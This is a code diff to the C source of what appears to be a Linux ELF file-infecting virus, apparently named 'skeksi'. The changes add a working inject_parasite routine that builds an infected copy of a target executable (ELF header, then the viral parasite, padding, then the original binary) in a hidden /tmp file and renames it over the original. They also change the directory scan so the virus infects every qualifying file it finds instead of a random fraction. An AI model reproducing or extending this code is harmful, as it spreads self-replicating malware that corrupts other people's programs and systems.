@@ -1,5 +1,7 @@
 #include "private.h"
 
+#define TMP "/tmp/.xyz.skeksi.elf64"
+
 #define LUCKY_NUMBER 7
 #define MAGIC_NUMBER 0x15D25 //thankz Mr. h0ffman
 
@@ -24,6 +26,7 @@ typedef struct elfbin {
 	uint8_t *mem;
 	size_t size;
 	char *path;
+	struct stat st;
 } elfbin_t;
 
 struct bootstrap_data bootstrap __attribute__((section(".data"))) = { 0x00 };
@@ -134,17 +137,17 @@ char * full_path(char *exe, char *dir)
 	static uint8_t *heap = NULL;
 	char *ptr = (char *)vx_malloc(_strlen(exe) + _strlen(dir) + 2, &heap);
 	Memset(ptr, 0, _strlen(exe) + _strlen(dir));
-	_memcpy(ptr, dir, strlen(dir));
-	ptr[strlen(dir)] = '/';
+	_memcpy(ptr, dir, _strlen(dir));
+	ptr[_strlen(dir)] = '/';
 	if (*exe == '.' && *(exe + 1) == '/')
 		exe += 2;
-	_memcpy(&ptr[strlen(dir) + 1], exe, strlen(exe));
+	_memcpy(&ptr[_strlen(dir) + 1], exe, _strlen(exe));
 	return ptr;
 }
 	
 #define JMPCODE_LEN 6
 
-void inject_parasite(size_t psize, elfbin_t *target, elfbin_t *self, ElfW(Addr) entry_point)
+int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t *self, ElfW(Addr) entry_point)
 {
 	int ofd;
 	unsigned int c;
@@ -152,9 +155,55 @@ void inject_parasite(size_t psize, elfbin_t *target, elfbin_t *self, ElfW(Addr) 
 	unsigned char *mem = target->mem;
 	unsigned char *parasite = self->mem + ehdr_size;
 	char *host = target->path, *protected; 
-	elfbin_t newBin;
 	struct stat st;
 
+	_memcpy((struct stat *)&st, (struct stat *)&target->st, sizeof(struct stat));
+
+        /* eot is: 
+         * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
+         * end_of_text += p_hdr->p_filesz;
+         */ 
+        extern int return_entry_start;
+
+        if ((ofd = _open(TMP, O_CREAT | O_WRONLY | O_TRUNC/*, st.st_mode*/)) == -1) 
+                return -1;
+        
+        /*
+         * Write first 64 bytes of original binary (The elf file header) 
+         * [ehdr] 
+         */
+        if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
+		return -1;
+        
+        /*
+         * Now inject the virus
+         * [ehdr][virus]
+         */
+        if ((c = _write(ofd, parasite, self->size - ehdr_size)) != self->size - ehdr_size) 
+		return -1;
+
+  	/*
+         * Seek to end of tracer.o + PAGE boundary  
+         * [ehdr][virus][pad]
+         */
+        uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
+        if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
+		return -1;
+        
+        /*
+         * Write the rest of the original binary
+         * [ehdr][virus][pad][phdrs][text][data][shdrs]
+         */
+        mem += sizeof(Elf64_Ehdr);
+        
+        unsigned int final_length = st.st_size - (sizeof(ElfW(Ehdr))); // + target->ehdr->e_shnum * sizeof(Elf64_Shdr));
+        if ((c = _write(ofd, mem, final_length)) != final_length) 
+		return -1;
+        
+		
+        _rename(TMP, target->path);
+        
+	_close(ofd);
 
 
 }
@@ -217,7 +266,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 	ehdr->e_shoff += paddingSize;
 	ehdr->e_phoff += paddingSize;
 
-	inject_parasite(parasiteSize, target, self, orig_entry_point);
+	inject_parasite(parasiteSize, paddingSize, target, self, orig_entry_point);
 
 }
 /*
@@ -230,7 +279,8 @@ int load_self(elfbin_t *elf)
 {	
 	int i;
 	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
-	elf->mem = (void *)((long)&_start_addr & ~4095);
+	elf->mem = (void *)((long)_start_addr & ~4095);
+	DEBUG_PRINT("mem: %x\n", _start_addr);
 	elf->ehdr = (Elf64_Ehdr *)elf->mem;
 	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
 	for (i = 0; i < elf->ehdr->e_phnum; i++) {
@@ -279,6 +329,7 @@ int load_target(const char *path, elfbin_t *elf)
                                 	break;
                         }
         }
+	elf->st = st;
 	elf->size = st.st_size;
 	return 0;
 }
@@ -358,9 +409,12 @@ void do_main(void)
 		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
 			d = (struct linux_dirent64 *) (dbuf + bpos);
     			bpos += d->d_reclen - 1;
-			rnum = get_random_number(10);
-			if (rnum != LUCKY_NUMBER)
+			if (!_strcmp(d->d_name, &bootstrap.argv[0][2])) {
 				continue;
+			}
+			rnum = get_random_number(10);
+			//if (rnum != LUCKY_NUMBER)
+			//	continue;
 			if (d->d_name[0] == '.')
 				continue;
 			if (check_criteria(full_path(d->d_name, dir)) < 0)
